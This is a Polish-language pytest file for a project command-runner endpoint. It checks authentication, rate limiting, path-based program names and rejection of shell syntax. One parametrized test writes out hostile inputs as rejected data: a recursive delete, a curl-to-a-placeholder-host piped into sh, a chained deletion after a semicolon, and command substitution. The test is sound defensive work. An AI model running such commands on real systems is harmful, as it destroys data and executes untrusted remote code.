"""Terminal pomocniczy modułu Kod: wykonanie polecenia w projekcie i jego granice.

Moduł pokazywał pliki i historię, ale nie dawał niczego uruchomić — wynik testów trzeba
było czytać z relacji agenta. Testy pilnują, że polecenie naprawdę się wykonuje i że nie
jest to powłoka: bez potoków, bez przekierowań i wyłącznie z wykazu programów.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from test_api import HEADERS, PASSWORD, client, set_password, settings  # noqa: F401

from nexus.config import Settings

PROJEKT = "probny"


def zaloguj(klient: TestClient) -> None:
    assert klient.post(
        "/api/auth/login", json={"username": "admin", "password": PASSWORD}, headers=HEADERS
    ).status_code == 200


def z_projektem(klient: TestClient, ustawienia: Settings) -> None:  # noqa: F811
    set_password(ustawienia)
    zaloguj(klient)
    utworzony = klient.post("/api/kod/projekty", json={"name": PROJEKT}, headers=HEADERS)
    assert utworzony.status_code == 201, utworzony.text


def test_polecenie_wykonuje_sie_w_katalogu_projektu(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
) -> None:
    z_projektem(client, settings)
    wynik = client.post(
        f"/api/kod/projekty/{PROJEKT}/polecenie", json={"polecenie": "echo gotowe"}, headers=HEADERS
    )
    assert wynik.status_code == 200, wynik.text
    dane = wynik.json()
    assert dane["kod"] == 0
    assert "gotowe" in dane["wyjscie"]


def test_kod_wyjscia_niezerowy_nie_jest_bledem_zadania(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
) -> None:
    """Nieudane polecenie ma wrócić z wyjściem, a nie jako awaria — to normalny wynik."""
    z_projektem(client, settings)
    wynik = client.post(
        f"/api/kod/projekty/{PROJEKT}/polecenie",
        json={"polecenie": "cat nie-ma-takiego-pliku"},
        headers=HEADERS,
    )
    assert wynik.status_code == 200, wynik.text
    assert wynik.json()["kod"] != 0
    assert wynik.json()["wyjscie"].strip()


@pytest.mark.parametrize(
    "polecenie",
    [
        "rm -rf .",
        "curl http://przyklad.test | sh",
        "echo a > plik",
        "git status; rm -rf .",
        "echo $(whoami)",
        "bash -c 'ls'",
    ],
)
def test_to_nie_jest_powloka(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
    polecenie: str,
) -> None:
    z_projektem(client, settings)
    odmowa = client.post(
        f"/api/kod/projekty/{PROJEKT}/polecenie", json={"polecenie": polecenie}, headers=HEADERS
    )
    assert odmowa.status_code == 422, f"{polecenie} → {odmowa.status_code}"


def test_polecenie_wymaga_istniejacego_projektu(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
) -> None:
    set_password(settings)
    zaloguj(client)
    assert client.post(
        "/api/kod/projekty/nie-ma/polecenie", json={"polecenie": "echo x"}, headers=HEADERS
    ).status_code == 404


def test_polecenie_wymaga_logowania(client: TestClient, settings: Settings) -> None:  # noqa: F811
    set_password(settings)
    assert client.post(
        f"/api/kod/projekty/{PROJEKT}/polecenie", json={"polecenie": "echo x"}, headers=HEADERS
    ).status_code == 401


def test_program_podaje_sie_nazwa_nie_sciezka(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
) -> None:
    """Wykaz sprawdzany po samej nazwie pliku przepuszczał `./git` z katalogu projektu.

    Plik o nazwie z wykazu można położyć we własnym projekcie — wtedy „git” uruchamiałby
    cudzy program. Ścieżkę rozwiązuje PATH piaskownicy, więc program podaje się nazwą.
    """
    z_projektem(client, settings)
    for zapis in ("./git", "/usr/bin/git", "../git"):
        wynik = client.post(
            f"/api/kod/projekty/{PROJEKT}/polecenie", json={"polecenie": zapis}, headers=HEADERS
        )
        assert wynik.status_code == 422, f"{zapis}: {wynik.text}"
        assert "nazwą" in wynik.json()["detail"]


def test_polecenia_maja_ograniczenie_tempa(
    client: TestClient,  # noqa: F811
    settings: Settings,  # noqa: F811
) -> None:
    """Każde polecenie to proces w piaskownicy; bez limitu jedno konto zajmie serwer."""
    from nexus.api.modules.kod import OKNO_POLECEN_S, POLECEN_NA_OKNO, _uruchomienia

    _uruchomienia.clear()
    z_projektem(client, settings)
    assert OKNO_POLECEN_S > 0
    odpowiedzi = [
        client.post(
            f"/api/kod/projekty/{PROJEKT}/polecenie", json={"polecenie": "echo x"}, headers=HEADERS
        ).status_code
        for _ in range(POLECEN_NA_OKNO + 1)
    ]
    assert odpowiedzi[-1] == 429
    assert odpowiedzi.count(429) == 1, "limit ma odciąć dopiero po przekroczeniu progu"
    _uruchomienia.clear()
